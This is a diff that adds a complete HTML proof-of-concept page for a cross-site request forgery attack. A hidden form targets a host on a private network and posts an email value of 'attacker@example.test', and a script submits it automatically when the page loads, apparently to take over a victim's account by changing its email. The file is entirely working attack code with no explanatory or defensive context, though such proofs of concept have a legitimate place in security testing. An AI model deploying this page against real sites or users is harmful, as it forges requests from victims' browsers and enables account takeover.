@@ -1,0 +1,15 @@
+<!doctype html>
+<html lang="ru">
+  <head>
+    <meta charset="utf-8">
+    <title>CSRF PoC</title>
+  </head>
+  <body>
+    <form id="csrf" action="http://10.0.0.40:1331/" method="POST">
+      <input type="hidden" name="email" value="attacker@example.test">
+    </form>
+    <script>
+      document.getElementById("csrf").submit();
+    </script>
+  </body>
+</html>
